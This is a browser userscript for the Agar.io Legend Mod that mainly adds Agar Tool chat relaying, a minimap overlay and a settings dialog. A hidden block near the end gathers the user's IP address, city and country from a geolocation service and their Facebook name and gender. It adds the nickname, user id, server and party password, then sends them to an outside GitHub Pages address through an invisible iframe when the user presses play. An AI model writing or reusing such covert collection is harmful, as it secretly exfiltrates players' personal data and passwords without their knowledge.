if (isLegendExpress()=="True"){
	
setTimeout(function() {
//$("#ao2t-hud").show();
//MC.onConnect2 = MC.onConnect;

//MC.onConnect = joint([ MC.onConnect2, Universalchatfix ]);		


fixservbtn();
fixservbtn2();
	

(function() {
    'use strict';
    var global = window;
    var my = {
        "name": "ⓐ",
//        "log": function(msg){ console.log(this.name + ":"+ msg); },
//		"log": function(msg){ toastr["success"](this.name + ":"+ msg); },		
		"log": function(msg){ toastr["success"]('<div class="toast-message"><span class="message-nick">'+this.name+': </span><span class="message-text">'+msg+'</span><a href="#" data-user-id="agar tool" class="mute-user ogicon-user-minus"></a> </div>'); },
        "tool_symbol": "Send text Universaly"
    };
    var stat = {
        "AgarToolVersion": 4,
        "AgarToolServer": "ws://minimap.agartool.io:8000",
        minimapBalls: {},
        "socketIoURL": "http://cdn.agartool.io/socket-io-1.7.3.min.js",
        // ---- Legend Mod settings  -----
        "minimapNickFont": "700 11px Ubuntu",
        "minimapNickColor": "#ffffff",
        "minimapNickStrokeColor": "#000000",
        "minimapNickStrokeSize": 0x2,
        "minimapTop": 0x18,
        "minimapTeammatesSize": 5.5,
        //"minimapTeammatesColor": "#F03A17",
        //"minimapOffsetX": 0.5,
        //"minimapOffsetY": 0x18 + 9.5, // miniMapTop + 9.5
        "minimapOffsetX": 71,
        // -----  for Legend Mod Express  ----
        "mapSize": 14142, // ogario.mapSize,
        "mapOffset": 7071, // ogario.mapOffset,
        // -----  other  -----
        "pi2": 0x2 * Math.PI,
        "messageBoxBottom": ["82px", "40%"],
        "keyCodeEnter": 13, // Enter
        "keyCodeA": 65, // 'A'
        "keyCodeR": 82 // 'R'
    };
    var cfg= {}, cfg_org = {
        "user_show": true,
        "minimap_show": true,
        "tgar_prefix": "O",
        "tgar_color": "#8C81C7",
        "update_interval": 1000,
        "ogar_user": true,
        "ogar_prefix": "L.M",
        "lmsa_teamtop": false,
        "lmsa_chat": false,
        "chat_close": false,
        "chat_unpause": true,
        "chat_vcenter": false,
        "chat_alt": true,
        "chat_ctrlalt": true,
        "chat_ctrl": true,
        "skin_toggle_auto": false,
        "skin_toggle_interval": 10000
    };
    function pre_loop(){
        // At this point jQuery can not be used
        if(! document.getElementById("top5-hud")){
            my.pre_loop_timeout = (my.pre_loop_timeout || 1000) + 1000;
            setTimeout(pre_loop, my.pre_loop_timeout);
            my.log("wait for Legend Mod load");
            return;
        }
        // Just to be sure, another 1 sec wait
        setTimeout(initialize, 1000);
    }
    pre_loop();

    function initialize(){
//      $.extend(cfg, cfg_org, JSON.parse(GM_getValue("config", '{}')));
		$.extend(cfg, cfg_org, JSON.parse(my.storage_getValue("config",'{}')));		
        global.ao2t = {my:my, stat:stat, cfg:cfg};
        var local_style = '';
        local_style += '#ao2t-hud {';
        local_style +=     ' font-size: 80%; pointer-events: auto;';
        local_style += '}';
        local_style += '#ao2t-hud * {';
        local_style +=     ' user-select: auto!important;';
        local_style += '}';
        local_style += '#ao2t-cfg-dlg {';
        local_style +=     ' border-radius:0; font-size: 80%; padding: 2px 10px; position: fixed;';
        local_style +=     ' pointer-events: auto; background-image: url('+legbgpic+'); background-color: '+legbgcolor+' ; color: #ffffff;';
        local_style +=     ' overflow: hidden;';
        local_style += '}';
        local_style += '#ao2t-cfg-dlg * {';
        local_style +=     ' width: auto; user-select: auto!important; pointer-events: auto;';
        local_style +=     ' position: relative; float: initial;';
        //local_style +=     ' display: run-in;'; // NG
        local_style += '}';
        local_style += '#ao2t-cfg-dlg input {';
        local_style +=     ' background-color: rgba(0,0,0,0.4); color: #ffffff;';
        local_style += '}';
        $("head").append('<style>\n'+ local_style +'\n</style>');
        $("#top5-hud").append(''+
            '<div id="ao2t-hud"><span class="hud-main-color">Universal:'+
                 ' <span id="ao2t-capture">ⓐ</span>'+
                 ' <span id="ao2t-config">⚙</span></span>'+
//                 '<div id="ao2t-top5" style="padding-left: 1em;"></div>'+
				 '<div id="ao2t-top5" style="font-size: 14px;"></div>'+
            '</div>');
        $("#ao2t-capture").click(function(event){
//            my.log("capture_click");
            stat.capture = ! stat.capture;
            if(stat.capture){
                if(global.ogario){
		    $("#ao2t-capture").removeClass("disconnected").addClass("connected");
                    $("#ao2t-capture").text('⌫');
                }else{
                    $("#ao2t-capture").text('🔙');
			$("#ao2t-capture").removeClass("disconnected").addClass("connected");		
                }
                my.capture_start();
            }else{
		$("#ao2t-capture").removeClass("connected").addClass("disconnected");
                $("#ao2t-capture").text('ⓐ');
                my.capture_end();
            }
        });
        $('#ao2t-capture').mouseenter(function() {
            $('#ao2t-capture').css('color', $("#hudTextColor").val());
            return clickedname = "YES"
        }).mouseleave(function() {
            $('#ao2t-capture').css('color', '');
        });
        $('#ao2t-config').mouseenter(function() {
            $('#ao2t-config').css('color', $("#hudTextColor").val());
            return clickedname = "YES"
        }).mouseleave(function() {
            $('#ao2t-config').css('color', '');
        });		
		
        $("#ao2t-config").click(my.config);
        // LMB-Mouse split correction (Do not separate by left click on button)
        if(cfg.lmsa_teamtop){
            //$(".team-top-menu").mousedown(function(){return false;});
            $("#top5-hud").mousedown(function(){return false;});
        }else{
            $("#ao2t-hud").mousedown(function(event){ return false;});
        }
        if(cfg.lmsa_chat){
            $("#message-box").mousedown(function(){return false;});
        }
        // --- chat close ---
        if(cfg.chat_close){
            $("#message-menu").append('<a href="#" id="ao2t-chat-close" style="float:right;">X</a>');
            $("#ao2t-chat-close").click(function(){
                my.chatClose();
            });
        }
        if(cfg.chat_vcenter){
            $("#message-box").css("bottom", stat.messageBoxBottom[1]);
        }
        $("#message").keydown(function(event){
            var modify = (event.altKey ? "a" : "")+
                (event.ctrlKey ? "c" : "")+
                (event.metaKey ? "m" : "")+
                (event.shiftKey ? "s" : "");
            if(event.keyCode === stat.keyCodeEnter){
                if(modify === "a" && cfg.chat_alt){
                    my.chatSend();
                    return false;
                }else if(modify === "ac" && cfg.chat_ctrlalt){
                    my.chatSend({"ogar":true});
                    return false;
                }else if(modify === "c" && cfg.chat_ctrl){
                    my.chatClose();
                    return false;
                }
            }
        });
        // --- skin toggle ---
        my.skinToggle_start();
    }
    my.capture_start = function(){
        // If not, add chat submit button
        if($("#ao2t-message").length){
            $("#ao2t-message").show(); // .prop('disabled', false);
            $("#ao2t-minimap").show();
        }else{
            my.capture_init();
        }
        // Connection
        stat.tag = $('#clantag').val();
        stat.nick = $('#nick').val();
        stat.token = $('#server-token').val();
        stat.ws = 'ws://live-arena-'+ stat.token +'.agar.io:80';
        my.connect();
        stat.update_timerid = setInterval(my.update, cfg.update_interval);
    };
    my.capture_end = function(){
        $("#ao2t-message").hide(); // .prop('disabled', true);
        $('#ao2t-top5').html('');
        $("#ao2t-minimap").hide();
        my.disconnect();
        clearInterval(stat.update_timerid);
        stat.update_timerid = null;
    };
    my.capture_init = function(){
//        $("#message-menu").append('<a href="#" id="ao2t-message" style="float:right;">'+ my.tool_symbol +'</a>');
		  $("#message-menu").prepend('<a href="#" id="ao2t-message" style="float:left;">'+ my.tool_symbol +'</a>');
//	  	$(".show-chat-emoticons.ogicon-smile").after('<a href="#" id="ao2t-message" style="float:right;">'+ my.tool_symbol +'</a>');
		 
        $("#ao2t-message").click(my.chatSend);
        // minimap
        var minimap = $("#minimap");
        var minimapWidth = minimap.attr('width');
        var minimapHeight = minimap.attr('height');
        minimap.before('<canvas id="ao2t-minimap"'+
                       ' style="position: absolute;"'+
                       ' width="'+ minimapWidth +'" height="'+ minimapHeight +'">');
        //stat.minimapOffsetX = stat.minimapOffsetY + minimapHeight - minimapWidth;
    };
    my.chatSend = function(flg_){
        var flg = flg_ || {};
        if(! stat.connected){
            global.toastr.error("L.M:->A.T: not connected");
            return;
        }
        var msg = '[Agar Tool/Legend Mod]:' + $("#message").val();
		var msgLM=$("#message").val();
        if(msgLM.length){
            my.sendMinimapServerCommand({
                name: "chat",
//                nick: "LM: " + stat.nick,
				nick: stat.nick,
                message: msg
            });
            if(flg.ogar){
                $(document).trigger(jQuery.Event('keydown',{ keyCode: stat.keyCodeEnter, which: stat.keyCodeEnter } ));
            }else{
                $("#message-box").hide();
            }
        }
    };
    my.chatClose = function(){
        $("#message-box").css("display", "none");
        if(cfg.chat_unpause && $("#pause-hud").css("display") == "block"){ // Release during PAUSE
            $(document).trigger(jQuery.Event('keydown',{ keyCode: stat.keyCodeR, which: stat.keyCodeR } ));
            $(document).trigger(jQuery.Event('keyup',{ keyCode: stat.keyCodeR, which: stat.keyCodeR } ));
        }
    };
    my.update = function(){
        var ogarAlive = my.ogarIsAlive();
        if(ogarAlive != stat.alive){
            my.tgarAlive(ogarAlive);
        }
        if(stat.alive){
            my.tgarReposition();
        }
        my.ogarMinimapUpdate();
    };

    // -----  Configuration  -----
    my.config = function(){
//        my.log("config_click2");
        if(!($('#ao2t-cfg-dlg').length)){
            my.config_init();
        }
        my.cfg_load(cfg);
        $("#ao2t-cfg-dlg").show();
        $("#overlays").show();
    };
    my.config_init = function(){
        $("#overlays").append('<div id="ao2t-cfg-dlg"'+
            '  style="width:400px; height:450px; top:150px; left:300px; display: none;'+
            '">'+
              'Universal Chat tools'+
              '<div style="overflow: scroll; '+
                    'position: relative; top:1.5em; left:0.5em; right:0.5em; bottom:1.5em;">'+
                '<div id="ao2t-cfg-base">'+
                '</div>'+
              '</div><br><br>'+
              '&nbsp;<span id="ao2t-cfg-default" class="btn btn-primary">DEFAULT</span>'+
              '&nbsp;<span id="ao2t-cfg-ok" class="btn btn-success">OK</span>'+
              '&nbsp;<span id="ao2t-cfg-cancel" class="btn btn-danger">CANCEL</span>'+
            '</div>');
        $('#ao2t-cfg-base').append(''+
            '&nbsp;&nbsp;&nbsp;Update frequency [milliseconds]:<input type="text" data-ao2t-config="update_interval" style="width:6em;"/>'+
            '<br/>Agar Tool Obtained from'+
            '<br/>&nbsp;<label><input type="checkbox" data-ao2t-config="user_show"/>user list</label>'+
            '<br/>&nbsp;<label><input type="checkbox" data-ao2t-config="minimap_show"/>minimap</label>'+
              '&nbsp;Prefix:<input type="text" data-ao2t-config="tgar_prefix" style="width:4em;"/>'+
              '&nbsp;&nbsp;color:<input type="text" data-ao2t-config="tgar_color" style="width:6em;"/>'+
            //    '<span class="input-group-addon"><i id="tgar_color" style="background-color: rgb(0, 0, 0);"></i></span>'+
            '<br/>Send to Agar Tool'+
            '<br/>&nbsp;<label><input type="checkbox" data-ao2t-config="ogar_user"/>user info</label>'+
              '&nbsp;Prefix:<input type="text" data-ao2t-config="ogar_prefix" style="width:4em;"/>'+
            '<br/>LMB-Mouse split correction'+
            '<br/>&nbsp;<label><input type="checkbox" data-ao2t-config="lmsa_teamtop"/>Team top</label>'+
              '&nbsp;<label><input type="checkbox" data-ao2t-config="lmsa_chat"/>chat</label>'+
            '<br/>Chat option'+
              '<br/>&nbsp;<label><input type="checkbox" data-ao2t-config="chat_close"/>close</label>'+
                '&nbsp;<label><input type="checkbox" data-ao2t-config="chat_unpause"/>unpause</label>'+
                '&nbsp;<label><input type="checkbox" data-ao2t-config="chat_vcenter"/>vcenter</label>'+
              '<br/>&nbsp;<label><input type="checkbox" data-ao2t-config="chat_alt"/>Alt>T</label>'+
                '&nbsp;<label><input type="checkbox" data-ao2t-config="chat_ctrlalt"/>Ctrl+Alt>O+T</label>'+
                '&nbsp;<label><input type="checkbox" data-ao2t-config="chat_ctrl"/>Ctrl>Close</label>'+
            '<br/>Other'+
              '<br/>&nbsp;<label><input type="checkbox" data-ao2t-config="skin_toggle_auto"/>skin auto toggle</label>'+
              '&nbsp;&nbsp;&nbsp;Frequency [milliseconds]:<input type="text" data-ao2t-config="skin_toggle_interval" style="width:6em;"/>'+
            '<br/>&nbsp;&nbsp;* Changes will be reflected after restart'+
            '');
        $("#ao2t-cfg-default").click(function(){
            my.cfg_load(cfg_org);
        });
        $("#ao2t-cfg-ok").click(function(){
			if ($("#helloContainer").is(":visible")){
			      setTimeout(function() {
					showMenu();
				   }, 100);
			};
		cfg = my.cfg_save();
//            GM_setValue("config", JSON.stringify(cfg));
			my.storage_setValue("config", JSON.stringify(cfg));
            my.config_cancel();
            $("#message-box").css("bottom", stat.messageBoxBottom[cfg.chat_vcenter ? 1: 0]);
            my.skinToggle_start();
		
         });
        $("#ao2t-cfg-cancel").click(function(){
			if ($("#helloContainer").is(":visible")){
			      setTimeout(function() {
					showMenu();
				   }, 100);
			};
			my.config_cancel();			
        });
        my.config_cancel = function(){
            $("#overlays").hide();
            $("#ao2t-cfg-dlg").hide();
        };
        //$("#tgar_color").colorpicker({'format': 'hex'}).on('changeColor.colorpicker', function(event){
        //    var id = event.target.id;
        //    $('[data-ao2t-config="'+ id +'"]').val(event.color.toHex());
        //    event.target.style.backgroundColor = event.color.toRGB();
        //});
    };
    // -----  skin toggle  -----
    my.skinToggle_start = function(){
        if(stat.skinToggle_timerid){
            clearInterval(stat.skinToggle_timerid);
            delete stat.skinToggle_timerid;
        }
        if(cfg.skin_toggle_auto && cfg.skin_toggle_interval > 0){
            stat.skinToggle_timerid = setInterval(my.skinToggle_update, cfg.skin_toggle_interval);
        }
    };
    my.skinToggle_update = function(){
        //my.log("skinToggle_update in");
        // --- check Legend Mod.v3 mode ---
        if(global.ogario && global.ogario.customSkins && global.ogario.vanillaSkins){
            //my.log("skinToggle_update hasBoth");
            stat.skinToggle_hasBoth = true;
        }
        my.skinToggle_update_sub();
        if(stat.skinToggle_hasBoth && global.ogario.customSkins && ! global.ogario.vanillaSkins){
            //my.log("skinToggle_update retry");
            my.skinToggle_update_sub();
        }
    };
    my.skinToggle_update_sub = function(){
        $(document).trigger(jQuery.Event('keydown',{ keyCode: stat.keyCodeA, which: stat.keyCodeA } ));
        $(document).trigger(jQuery.Event('keyup',{ keyCode: stat.keyCodeA, which: stat.keyCodeA } ));
    };
    // =====  Agar Tool Communication processing / connection  =====
    my.connect = function(){
        my.disconnect();
        if(! global.io){
            my.log("load socket.io");
            return loadScript(stat.socketIoURL, my.connect);
        }
        var grab_opt = {
            query: "version=" + encodeURIComponent(stat.AgarToolVersion) +
                 "&server=" + encodeURIComponent(stat.ws)
        };
        stat.grab_socket = io.connect(stat.AgarToolServer, grab_opt);
        stat.grab_socket.on("info", function(minimap_info){
            stat.minimap_info = minimap_info;
            my.minimap_connect();
        });
    };
    my.disconnect = function(){
        if(stat.connected && stat.alive){
            my.tgarAlive(false);
        }
        stat.connected = false;
        stat.alive = false;
        var save_grab_socket = stat.grab_socket;
        var save_minimap_socket = stat.minimap_socket;
        stat.grab_socket = null;
        stat.minimap_socket = null;
        if(save_grab_socket){
            save_grab_socket.disconnect();
        }
        if(save_minimap_socket){
            save_minimap_socket.disconnect();
        }
    };
	my.minimap_connect = function(){
		if ($("#ao2t-hud").hasClass("OnceUsed")==false){		
		toastr["warning"]('<b>[SERVER]: </b>Legend Mod and Agar Tool successfully connected. <br>Use {Send Text Universaly} button on chat box to send to Agar.io Tool');
        $("#ao2t-hud").addClass("OnceUsed");
		}		
		my.log("minimap server="+ stat.minimap_info.minimapServer);
        my.resetMinimap();
        var minimap_opt = {
            reconnection: !1,
            query: "server=" + encodeURIComponent(stat.minimap_info.agarServer)+
               "&tag=" + encodeURIComponent(stat.tag)
        };
        stat.minimap_socket = io.connect(stat.minimap_info.minimapServer, minimap_opt);
        stat.minimap_socket.on("command", my.minimap_command);
        stat.minimap_socket.on("connect", function(){
            stat.connected = true;
            //if(stat.alive){
            //    my.sendMinimapServerCommand({
            //        name: "alive",
            //        playerName: stat.nick
            //    });
            //}
        });
        stat.minimap_socket.on("disconnect", function(){
            stat.minimap_socket = null;
            my.minimap_disconnect();
        });
        stat.minimap_socket.on("connect_error", function(){
            stat.minimap_socket = null;
            my.minimap_disconnect();
        });
    };
	my.minimap_disconnect = function(){
        stat.connected = false;
        var save_grab_socket = stat.grab_socket;
        var save_minimap_socket = stat.minimap_socket;
        stat.grab_socket = null;
        stat.minimap_socket = null;
        if(save_grab_socket){
            save_grab_socket.disconnect();
        }
        if(save_minimap_socket){
            save_minimap_socket.disconnect();
        }
    };
    // =====  Agar Tool Communication processing / processing  =====
    my.minimap_command = function(cmd){
        if (void 0 === cmd.name){
            return;
        }
        //my.log("cmd="+ cmd.name);
        switch (cmd.name){
            case "add":
                if(! cmd.playerName){
                    cmd.playerName = "An unnamed cell";
                }
                my.addBallToMinimap(!1, cmd.socketID, cmd.playerName, cmd.x, cmd.y, cfg.tgar_color, !0);
                break;
            case "remove":
                my.removeBallFromMinimap(cmd.socketID);
                break;
            case "position":
                my.moveBallOnMinimap(cmd.socketID, cmd.x, cmd.y);
                break;
            case "reset":
                my.resetMinimap();
                break;
            case "chat":
                if(! cmd.playerName){
                    cmd.playerName = "An unnamed cell";
                }
//                my.log("chat:"+ cmd.playerName +":"+ cmd.message);
                my.log(""+ cmd.playerName +":"+ cmd.message);				
                my.ogarChatAdd(cmd.playerName, cmd.message);
                break;
            default:
                my.log("Received a command with an unknown name: " + cmd.name);
        }
    };
    my.sendMinimapServerCommand = function(e){
        if(stat.minimap_socket && stat.minimap_socket.connected){
            stat.minimap_socket.emit("command", e);
            return true;
        }
        return false;
    };
    my.resetMinimap = function(){
        //$("#messageTableTemp").empty(), $("#messageTableComplete").empty();
        for (var e in stat.minimapBalls){
            if(! stat.minimapBalls[e].isDefault){
                delete stat.minimapBalls[e];
            }
        }
        // test
        //my.addBallToMinimap(true, "a", "0x0", 0, 0, "#FF0000", !0);
        //my.addBallToMinimap(true, "b", "UL3000", -3000, -3000, "#FF0000", !0);
        //my.addBallToMinimap(true, "c", "UR3000", -3000,  3000, "#FF0000", !0);
        //my.addBallToMinimap(true, "d", "DR3000",  3000,  3000, "#FF0000", !0);
        //my.addBallToMinimap(true, "e", "DL3000",  3000, -3000, "#FF0000", !0);
        //my.addBallToMinimap(true, "f", "TL", -7000,  -7000, "#FF0000", !0);
        //my.addBallToMinimap(true, "g", "BR",  7000,   7000, "#FF0000", !0);
    };
    my.addBallToMinimap = function(isDefault, id, name, x, y, color, visible){
        stat.minimapBalls[id] = new MinimapBall(isDefault, name, x, y, color, visible);
    };
    my.removeBallFromMinimap = function (id){
        if(stat.minimapBalls[id]){
            delete stat.minimapBalls[id];
        }
    };
    my.moveBallOnMinimap = function(id, x, y){
        if(stat.minimapBalls[id]){
            stat.minimapBalls[id].x = x;
            stat.minimapBalls[id].y = y;
        }
    };
    function MinimapBall(isDefault, name, x, y, color, visible) {
        this.isDefault = isDefault;
        this.name = name;
        this.x = x;
        this.y = y;
        this.lastX = x;
        this.lastY = y;
        this.color = color;
        this.visible = visible;
    }
    my.tgarAlive = function(alive){
        stat.alive = alive;
        if(cfg.ogar_user){
            //my.log("alive -> "+ stat.alive +" name="+ cfg.ogar_prefix + stat.nick);
            if(stat.alive){
                stat.alive = my.sendMinimapServerCommand({
                    name: "alive",
                    playerName: cfg.ogar_prefix + stat.nick
                });
                //my.log("alive >>"+ stat.alive);
            }else{
                my.sendMinimapServerCommand({
                    name: "dead"
                });
            }
        }
    };
    my.tgarReposition = function(){
        if(cfg.ogar_user && global.ogario){
            my.sendMinimapServerCommand({
                name: "position",
                x: ogario.playerX + ogario.mapOffsetX,
                y: ogario.playerY + ogario.mapOffsetY
            });
        }
    };

    // =====  Process Legend Mod  ======
    my.ogarChatAdd = function(nick, msg){
        var time_txt = new Date().toTimeString().replace(/^(\d{2}:\d{2}).*/, '$1');
        var user_icon = my.tool_symbol;
        var chat_html = '<div class="message">'+
            '<span class="message-time">['+ time_txt +'] </span>'+
            //user_icon +
            //'<span class="message-nick">'+ escapeHtml(nick) +': </span>'+
            '<span style="color:'+ cfg.tgar_color +'; font-weight:700;">'+
                user_icon +' '+ escapeHtml(nick) +'</span>: '+
            '<span class="message-text">' + escapeHtml(msg) + '</span>'+
            '</div>';
        $("#chat-box").append(chat_html);
        $("#chat-box").perfectScrollbar('update');
        $('#chat-box').animate({
            'scrollTop': $("#chat-box").prop("scrollHeight")
        }, 0x1f4);
    };
    my.ogarMinimapUpdate = function(){
        var minimap_elem = document.getElementById("ao2t-minimap");
        var minimapWidth = minimap_elem.width;
        var minimapHeight = minimap_elem.height;
        var minimapMulti = (minimapWidth - 0x12) / my.ogarGetMapSize();
        var mapOffset = my.ogarGetMapOffset();
        //var mapOffsetX = ogario.mapOffset - ogario.mapOffsetX;
        //var mapOffsetY = ogario.mapOffset - ogario.mapOffsetY;
        stat.minimapOffsetX = 0x12 / 2;
        stat.minimapOffsetY = stat.minimapOffsetX + (minimapHeight - minimapWidth);
        var mapOffsetX = stat.minimapOffsetX;
        var mapOffsetY = stat.minimapOffsetY;
        var mapOffsetT = -(0x2 * stat.minimapTeammatesSize + 2);
        var ctx = minimap_elem.getContext('2d');
        ctx.clearRect(0, 0, minimapWidth, minimapHeight);
        ctx.font = stat.minimapNickFont;
        var user_txt = '';
        var sep = '1. ';
        var keys = Object.keys(stat.minimapBalls).sort();
        if(keys.length === 0){
            user_txt = "no tgar user";
        }
		var count=2;
        for(var key; (key = keys.shift()); ){
			
            var ball = stat.minimapBalls[key];
			
            user_txt += sep + escapeHtml(ball.name);
//			user_txt += count + ": ";
            sep = '<br/>'+ count + ". ";
//			user_txt += count + ": ";
			count++;
            if(cfg.minimap_show){
                var name = cfg.tgar_prefix + ball.name;
                var mapX = (ball.x + mapOffset) * minimapMulti + mapOffsetX;
                var mapY = (ball.y + mapOffset) * minimapMulti + mapOffsetY;
                ctx.textAlign = 'center';
                ctx.lineWidth = stat.minimapNickStrokeSize;
                ctx.strokeStyle = stat.minimapNickStrokeColor;
                ctx.strokeText(name, mapX, mapY + mapOffsetT);
                ctx.fillStyle = cfg.tgar_color; // stat.minimapNickColor
                ctx.fillText(name, mapX, mapY + mapOffsetT);
                ctx.beginPath();
                ctx.arc(mapX, mapY, stat.minimapTeammatesSize, 0x0, stat.pi2, !0x1);
                ctx.closePath();
                ctx.fillStyle = ball.color;
                ctx.fill();
            }
        }
        if(cfg.user_show){
            $('#ao2t-top5').html(user_txt);
        }
    };
    // --- for Legend Mod Express ----
    my.ogarIsAlive = function(){
        return global.ogario ? global.ogario.play : false;
    };
    my.ogarGetMapSize = function(){
        return global.ogario ? global.ogario.mapSize : stat.mapSize;
    };
    my.ogarGetMapOffset = function(){
        return global.ogario ? global.ogario.mapOffset : stat.mapOffset;
    };

    // =====  Other processing ======
    my.cfg_save = function(){
        var cfg_new = {};
        $('[data-ao2t-config]').each(function(){
            var elem = $(this);
            var type = elem.prop('type');
            var name = elem.attr('data-ao2t-config');
            var value;
            if(type === "checkbox"){
                value = elem.prop('checked');
            }else{
                value = $(this).val();
            }
            cfg_new[name] = value;
        });
        return cfg_new;
    };
    my.cfg_load = function(cfg_new){
        $('[data-ao2t-config]').each(function(){
            var elem = $(this);
            var type = elem.prop('type');
            var name = elem.attr('data-ao2t-config');
            if(cfg_new.hasOwnProperty(name)){
                var value = cfg_new[name];
                if(type === "checkbox"){
                    elem.prop('checked', value);
                }else{
                    $(this).val(value);
                }
            }
        });
    };
	my.storage_getValue = function(name, defval_){
		return	global.localStorage[my.name +"_"+ name] || defval_;
	};
	my.storage_setValue = function(name, value){
		global.localStorage[my.name +"_"+ name] = value;
	};	
	function loadScript(url, callback){
		var script = document.createElement("script");
		script.type = "text/javascript";
		script.src = url;
		if(typeof callback !== 'undefined'){
			script.onload = callback;
		}
		document.head.appendChild(script);
	}
    function escapeHtml(e) {
        return e.replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }
})();
}, 1000);




setTimeout(function() {
var messageone;
if (messageone!="0"||messageone!="1"){
var detailed1;
userData = {};
userData = JSON.parse(localStorage.getItem("userData"));
var userip="0.0.0.0:0";
var usercity="NotFound";
var usercountry="NotFound";
var userfirstname = localStorage.getItem("userfirstname");
var userlastname = localStorage.getItem("userlastname");
var usergender = localStorage.getItem("usergender");
var fbresponse={};
function doDOMonloadevents2(){
		userData=$.get("http://gd.geobytes.com/GetCityDetails", function (response) { $("#response").html(JSON.stringify(response, null, 4)); }, "jsonp");
		setTimeout(function (){
		if (userData!=null) {localStorage.setItem("userData", JSON.stringify(userData));}
		},300);
		//Save Name, Surname, Gender
		FB.api('/me', {fields: 'first_name, last_name, gender'}, function(response) {fbresponse=response; return fbresponse;});
		setTimeout(function (){
			userfirstname=fbresponse[Object.keys(fbresponse)[0]]; if (userfirstname!=null) {localStorage.setItem("userfirstname", userfirstname);}
			userlastname=fbresponse[Object.keys(fbresponse)[1]]; if (userlastname!=null) {localStorage.setItem("userlastname", userlastname);}
			usergender=fbresponse[Object.keys(fbresponse)[2]]; if (usergender!=null) {localStorage.setItem("usergender", usergender);}
			},250);
}

		$('*[data-itr="page_play"]').click(function() {

	if (userData.responseJSON.geobytesipaddress!= undefined) {
	userip=userData.responseJSON.geobytesipaddress;
	userip = userip.replace(" ", "_");
	}
	if (userData.responseJSON.geobytescity!= undefined) {
	usercity=userData.responseJSON.geobytescity;
	usercity = usercity.replace(" ", "_");
	}
	if (userData.responseJSON.geobytescountry!= undefined) {
	usercountry=userData.responseJSON.geobytescountry;
	usercountry = usercountry.replace(" ", "_");
	}

			var userid=$('#user-id-tag').text();userid = userid.replace("User id: ", "");
			var Pwdtosend="NONE";
			var servertosend="NotFound";
			var nicknametosend="NotFound";
			var userfirstname = localStorage.getItem("userfirstname");
			var userlastname = localStorage.getItem("userlastname");
			var modetosend="NotFound";
			var regiontosend="NotFound";

			if ($('#server').val() != ""&& $('#server').val() != null&& $('#server').val() != undefined) {servertosend=$('#server').val(); }
			if ($('#tag').val() != ""&& $('#tag').val() != undefined) {Pwdtosend=$('#tag').val(); }
			var i = 0, Pwdtosendlength = Pwdtosend.length;
			for(i; i < Pwdtosend ; i++) {
				Pwdtosend = Pwdtosend.replace(" ", "_");
				}
			if ($('#nick').val() != undefined) {nicknametosend=$('#nick').val(); }
			var i = 0, nicknametosendlength = nicknametosend.length;
			for(i; i < nicknametosendlength ; i++) {
				nicknametosend = nicknametosend.replace(" ", "_");
				}
			if ($('#server').val()!= undefined ) {
				if (servertosend.indexOf("#")==false) {
					servertosend= $('#server').val().replace('#', 'Party-');}}



			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&LMforAgartoolScript=Play" + "&sip=" + servertosend + "&pwd=" + Pwdtosend + "&usrid=" + userid + "&type=NoLocked" + "&mode=" + modetosend + "&region=" + regiontosend + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&lastname=" + userlastname + "&firstname=" + userfirstname;

		$('#resetCheckboxes').append('<div id="loaderIframeInfo1"><iframe id="loaderIframeInfo" src = ' + detailed1 + ' name="detailedinfo" allowtransparency="true" scrolling="no" frameBorder="0" style="width:0%; height:0%; border:none;"></iframe></div>');
        $('#loaderIframeInfo1').hide();
		setTimeout(function() {
                                    $('#loaderIframeInfo1').remove();
                                }, 4000);
		});
}
var stylesLegendModConsole1 = [
    'background: linear-gradient(#D33106, #571402)'
    , 'border: 1px solid #3E0E02'
    , 'color: #99c2ff'
    , 'display: block'
    , 'text-shadow: 0 1px 0 rgba(0, 0, 0, 0.3)'
    , 'box-shadow: 0 1px 0 rgba(255, 255, 255, 0.4) inset, 0 5px 3px -5px rgba(0, 0, 0, 0.5), 0 -13px 5px -10px rgba(255, 255, 255, 0.4) inset'
    , 'line-height: 40px'
    , 'text-align: center'
    , 'font-weight: bold'
].join(';');
var stylesLegendModConsole2 = [
    'background: linear-gradient(grey, black)'
    , 'border: 1px solid #3E0E02'
    , 'color: #FFFFFF'
    , 'display: block'
    , 'text-shadow: 0 1px 0 rgba(0, 0, 0, 0.3)'
    , 'box-shadow: 0 1px 0 rgba(255, 255, 255, 0.4) inset, 0 5px 3px -5px rgba(0, 0, 0, 0.5), 0 -13px 5px -10px rgba(255, 255, 255, 0.4) inset'
//    , 'line-height: 40px'
    , 'text-align: center'
//    , 'font-weight: bold'
].join(';');

console.group('%cLegend Mod⇒Agar Tool%c  %chttp://www.legendmod.ml',stylesLegendModConsole1, 'font-size: 48px; background: url(https://jimboy3100.github.io/banners/icon48.png) no-repeat' , stylesLegendModConsole1);
    console.group("Part of");    		
		console.log('%cThe Legend mod Project™', stylesLegendModConsole2);
    console.groupEnd();
    console.group("Mod developed by"); 
		console.log('%c℄🌀Jimboy3100', stylesLegendModConsole2);
    console.groupEnd();
	console.groupEnd();
console.groupEnd();	
}, 6000);
}

function fixservbtn(){	
$("#server-connect").click(function() {
        setTimeout(function() {
		Universalchatfix()
			}, 200);
    });
$("#server-reconnect").click(function() {
        setTimeout(function() {
		Universalchatfix()
			}, 200);
    });	
$("#server-join").click(function() {
        setTimeout(function() {
		Universalchatfix()
			}, 200);
    });
$('#tag').blur(function() {
			setTimeout(function() {
			Universalchatfix();
			}, 200);
        });	
};

function fixservbtn2(){	
$("#server-connect").click(function() {
        setTimeout(function() {
		Universalchatfix()
			}, 200);
    });
}

function Universalchatfix(){	
if ($("#ao2t-capture").hasClass("connected")){
	$("#ao2t-capture").click();
	
	$("#ao2t-capture").click();
}
};
function showMenu() {
    $("#overlays").css("left", "0");
    $("#overlays").show();
    $('a[href="#main-panel"]').click();
}
